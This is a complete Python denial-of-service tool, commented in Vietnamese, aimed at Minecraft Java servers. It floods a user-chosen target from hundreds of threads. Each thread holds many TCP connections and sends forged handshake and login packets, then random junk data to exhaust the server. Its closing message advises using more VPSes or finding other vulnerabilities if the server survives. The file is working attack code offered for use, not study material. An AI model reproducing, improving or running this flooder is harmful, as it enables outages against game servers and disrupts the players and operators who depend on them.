import os
import sys
import socket
import threading
import time
import random
import struct
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

BANNER = f"""
{Fore.RED}SKI TCP FLOOD - JAVA MODE 2026 - NO BOT NO UDP{Style.RESET_ALL}
    Aggressive Handshake + Login Spam
"""

def varint(n):
    out = bytearray()
    while True:
        byte = n & 0x7F
        n >>= 7
        out.append(byte | (0x80 if n else 0))
        if not n:
            break
    return bytes(out)

def minecraft_handshake(host, port, protocol=767):  # 1.21.3 = 767, 1.21.4 ~768
    # Handshake packet: ID 0x00
    p = varint(protocol)  # protocol version
    p += varint(len(host)) + host.encode('utf-8')
    p += struct.pack('>H', port)
    p += varint(2)  # next state: login
    return varint(len(p)) + b'\x00' + p

def minecraft_login(username_prefix="fuck"):
    name = username_prefix + str(random.randint(10000, 999999))
    p = varint(len(name)) + name.encode('utf-8')
    # No properties (offline mode style)
    return varint(len(p)) + b'\x00' + p

def tcp_worker(ip, port, duration, thread_id, stop_event):
    conns = []
    sent = 0
    start = time.time()
    
    while time.time() - start < duration and not stop_event.is_set():
        try:
            # Giữ 50-150 conn mỗi thread
            target_conns = random.randint(50, 150)
            while len(conns) < target_conns:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)  # thấp để reconnect nhanh
                    s.connect((ip, port))
                    conns.append(s)
                    
                    # Gửi handshake + login ngay
                    host_str = f"localhost{random.randint(1,999)}"  # fake host
                    hs = minecraft_handshake(host_str, port)
                    login = minecraft_login()
                    
                    s.sendall(hs)
                    time.sleep(0.01 + random.random()*0.03)  # nhỏ để giống thật
                    s.sendall(login)
                    
                    sent += 2  # 1 handshake + 1 login
                except:
                    pass  # fail thì skip, retry sau
            
            # Gửi thêm random data để giữ conn & tốn CPU server
            if conns:
                conn = random.choice(conns)
                try:
                    junk_size = random.randint(512, 16384)
                    junk = random.randbytes(junk_size)
                    conn.sendall(junk)
                    sent += 1
                except:
                    conns.remove(conn)
                    conn.close()
                
                # Random close 10-20% để reconnect mới (tạo half-open)
                if random.random() < 0.15:
                    conns.remove(conn)
                    conn.close()
            
            if sent % 1000 == 0:
                now = datetime.now().strftime('%H:%M:%S')
                rate = sent / (time.time() - start)
                print(f"{Fore.CYAN}[{now}] T{thread_id} | {sent:,} pkts | ~{rate:.0f}/s{Style.RESET_ALL}")
                
        except Exception:
            time.sleep(0.003)  # tránh CPU 100% khi lỗi liên tục
    
    # Cleanup
    for c in conns:
        try: c.close()
        except: pass
    print(f"{Fore.YELLOW}[T{thread_id}] STOP • Tổng ~{sent:,} packets{Style.RESET_ALL}")

def resolve_target(target):
    if ':' in target:
        h, p = target.rsplit(':', 1)
        return socket.gethostbyname(h), int(p)
    return socket.gethostbyname(target), 25565

def main():
    clear_screen()
    print(BANNER)
    
    target = input(f"{Fore.YELLOW}[>] Target (ip hoặc domain:port): {Style.RESET_ALL}").strip()
    ip, port = resolve_target(target)
    print(f"{Fore.GREEN}[+] → {ip}:{port}{Style.RESET_ALL}")
    
    duration = int(input(f"{Fore.YELLOW}[>] Thời gian (giây, max 600): {Style.RESET_ALL}") or 300)
    threads = int(input(f"{Fore.YELLOW}[>] Threads (100–800, thử 300+): {Style.RESET_ALL}") or 300)
    
    print(f"\n{Fore.RED}→ TCP FLOOD BẮT ĐẦU → handshake + login spam aggressive...{Style.RESET_ALL}\n")
    
    stop = threading.Event()
    ths = []
    
    for i in range(threads):
        t = threading.Thread(target=tcp_worker, args=(ip, port, duration, i+1, stop), daemon=True)
        t.start()
        ths.append(t)
    
    try:
        time.sleep(duration + 4)
        stop.set()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Dừng tay...{Style.RESET_ALL}")
        stop.set()
    
    for t in ths:
        t.join(timeout=2)
    
    print(f"\n{Fore.GREEN}XONG. Tổng packet gửi cực lớn. Nếu vẫn không sập → server có TCPShield/Velocity + rate-limit mạnh. Cần nhiều máy/VPS hơn hoặc tìm lỗ hổng khác.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
